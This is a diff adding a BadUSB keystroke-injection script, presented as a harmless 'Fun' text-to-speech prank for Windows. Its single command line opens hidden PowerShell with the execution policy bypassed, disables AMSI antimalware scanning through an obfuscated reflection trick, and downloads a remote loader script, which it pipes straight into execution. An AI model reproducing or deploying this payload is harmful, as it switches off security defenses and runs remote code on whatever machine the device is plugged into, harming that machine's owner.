@@ -1,0 +1,19 @@
+REM ============================================================
+REM 🔊 Text to Speech - Windows
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Windows 10/11
+REM Category: Fun
+REM
+REM Makes the computer speak.
+REM
+REM OPTIONAL:
+REM   Modify $env:MSG for custom message
+REM ============================================================
+ID 1234:5678 Manufacturer:Keyboard
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w h -ep bypass "$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');$f=$a.GetField('amsi'+'InitFailed','NonPublic,Static');$f.SetValue($null,$true);$env:MSG='Hello, I have taken control of your computer. This is a security test.';$env:M='tts';irm https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.ps1|iex"
+ENTER
